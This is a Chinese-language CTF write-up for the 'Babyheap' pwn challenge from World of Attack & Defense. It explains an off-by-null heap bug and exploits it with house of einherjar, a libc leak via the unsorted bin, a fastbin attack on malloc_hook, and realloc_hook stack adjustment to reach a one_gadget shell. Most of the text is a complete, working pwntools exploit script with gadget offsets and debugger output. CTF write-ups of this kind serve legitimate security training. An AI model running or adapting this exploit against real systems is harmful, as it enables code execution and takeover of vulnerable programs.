# Babyheap

## 来源
World of Attack & Defense


## 难度

8 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

只有4个功能, 添加,删除,查看,退出.保护全开,只有一个漏洞可以利用.

## vul

```c
unsigned __int64 __fastcall read_input(__int64 a1, int a2)
{
  char buf; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < a2; ++i )
  {
    if ( (signed int)read(0, &buf, 1uLL) < 0 )
      puts("Read error!\n");
    if ( buf == 10 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;                       // off by null
  return __readfsqword(0x28u) ^ v5;
}
```

off by null 漏洞,还有一个是在free时,unsigned int与signed int的索引值,但利用不了...

## 知识点

house of einherjar, off by one, unlink check, fastbin attack, realloc_hook to banance stack, one_gadget

## 思路

通过house of einherjar实现堆合并,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数



## 利用

### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "timu"
libFile  = "./libc.so.6"
libFile  = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice :', str(1))
	sla('Size:', str(size))
	sa('Data:', data)

def rm(idx):
	sla('Your choice :', str(2))
	sla('Index:', str(idx))


def dp():
	sla('Your choice :', str(3))

#def q():
#	sla(':', str(5))	
```



### 构造堆快布局

```python
	ad(0x80, 'A' * 0x80) # idx 0 为了合并
	ad(0x80, 'B' * 0x80) # idx 1 为了在合并后,然后分割堆快打印出main_arena
	ad(0x68, 'C' * 0x68) # idx 2 为了可以利用fastbin attack 和 off by null
	ad(0xF0, 'E\n') # idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块
	ad(0x68, 'F\n') #为了防止top chunk 向前合并
```

### 使用house of einherjar 来合并 chunk 1

```python
	rm(2) #为了使用 off by null 覆盖 chunk3 释放重新开辟
	# use house of einherjar
	p = 'C' * 0x60 
	p += p64(0x190) #prev_size = chunk 0 addr - chunk 3 addr
	ad(0x68, p) #使用 off by null 覆盖 chunk 3

	rm(2) #先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方
	# 触发 house of eiherjar
    #避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK->fd != p
	rm(0) 
	rm(3)  #合并到chunk 0
```

### 泄漏 main_arena 和libc基址

通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址

```python
	# leak main_arena
	ad(0x80, 'A' * 16 + '\n') #分割 unsorted bin, main_arena 会出现在 chunk 1中
	dp()
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	li('main_arena ' + hex(main_arena))
	li('libc_base ' +  hex(libc_base))
```

### fastbin attack打入 malloc_hook处

```python
	#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处
    p = '\x00' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	p += '\n'
	ad(0xA0, p)
	
	ad(0x68, '\n') #for ajust fastbin
    
```

### 修改malloc_hook

由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget
#### realloc_hook反汇编
```
pwndbg> disass 0x7fe7cb0ea6c0
Dump of assembler code for function __GI___libc_realloc:
   0x00007fe7cb0ea6c0 <+0>:	push   r15
   0x00007fe7cb0ea6c2 <+2>:	push   r14
   0x00007fe7cb0ea6c4 <+4>:	push   r13
   0x00007fe7cb0ea6c6 <+6>:	push   r12
   0x00007fe7cb0ea6c8 <+8>:	mov    r13,rsi
   0x00007fe7cb0ea6cb <+11>:	push   rbp
   0x00007fe7cb0ea6cc <+12>:	push   rbx
   0x00007fe7cb0ea6cd <+13>:	mov    rbx,rdi
   0x00007fe7cb0ea6d0 <+16>:	sub    rsp,0x38
   0x00007fe7cb0ea6d4 <+20>:	mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0
   0x00007fe7cb0ea6db <+27>:	mov    rax,QWORD PTR [rax]
   0x00007fe7cb0ea6de <+30>:	test   rax,rax
   0x00007fe7cb0ea6e1 <+33>:	jne    0x7fe7cb0ea8e8 <__GI___libc_realloc+552>
   0x00007fe7cb0ea6e7 <+39>:	test   rsi,rsi
   0x00007fe7cb0ea6ea <+42>:	jne    0x7fe7cb0ea6f5 <__GI___libc_realloc+53>
   0x00007fe7cb0ea6ec <+44>:	test   rdi,rdi

```
通过调试试出了两个one_gadget满足execve 第二个参数内容为0

1. malloc_hook = libc_base + 0x4526a, realloc_hook = realloc_addr + 2
2. malloc_hook = libc_base + 0xf1147, realloc_hook = realloc_addr + 20

#### execve执行情况如下

```
0x7fe7cb15715d <exec_comm+2285>    call   execve <0x7fe7cb132770>
path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* '/bin/sh' */
argv: 0x7ffe640ad200 ◂— 0x0
envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— 'LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6'
```

#### payload构造如下

```python
	#modify malloc_hook
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' +  hex(realloc_addr))
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = libc_base + gadget[3]
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget) # realloc_hook
	#mallok_hook then call realloc for banance stackthen call one_gadget
	p += p64(realloc_addr + 20) # malloc_hook
	p += '\n'
	ad(0x68, p)
	
```

## get shell

```python
	# get shell
	sl('1')
	sl('1')
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "timu"
libFile  = "./libc.so.6"
libFile  = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice :', str(1))
	sla('Size:', str(size))
	sa('Data:', data)

def rm(idx):
	sla('Your choice :', str(2))
	sla('Index:', str(idx))


def dp():
	sla('Your choice :', str(3))

#def q():
#	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x80, 'A' * 0x80) # idx 0
	ad(0x80, 'B' * 0x80) # idx 1
	ad(0x68, 'C' * 0x68) # idx 2
	ad(0xF0, 'E\n')      # idx 3
	ad(0x68, 'F\n') #for avoid merge to top chunk
	rm(2)
	# use house of einherjar
	p = 'C' * 0x60
	p += p64(0x190) 
	ad(0x68, p)

	rm(2) #for fastbin attack, now make it in fastbin
	# trigger house of eiherjar
	rm(0)
	rm(3)
	# leak main_arena
	ad(0x80, 'A' * 16 + '\n')
	dp()
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	li('main_arena ' + hex(main_arena))
	li('libc_base ' +  hex(libc_base))
	# fastbin attack to malloc_hook - 0x23
	p = '\x00' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	p += '\n'
	ad(0xA0, p)
	
	ad(0x68, '\n') #for ajust fastbin
	#modify malloc_hook
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' +  hex(realloc_addr))
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = libc_base + gadget[3]
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget)
	#mallok_hook then call realloc for banance stackthen call one_gadget

	p += p64(realloc_addr + 20)
	p += '\n'
	ad(0x68, p)
	# get shell
	sl('1')
	sl('1')
	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

